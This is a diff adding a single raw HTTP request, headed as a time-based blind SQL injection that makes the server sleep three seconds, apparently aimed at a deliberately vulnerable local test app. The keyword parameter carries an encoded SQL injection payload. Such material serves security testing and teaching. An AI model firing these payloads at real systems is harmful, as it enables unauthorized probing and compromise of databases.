@@ -1,0 +1,6 @@
+### Time-based Blind SQL Injection Request (3-Second Server Sleep)
+GET /search?keyword=%27+AND+IF(1%3D1%2C+SLEEP(3)%2C+0)+--+&category=ALL&mode=vulnerable HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Referer: http://localhost:8080/search.jsp
+Connection: keep-alive
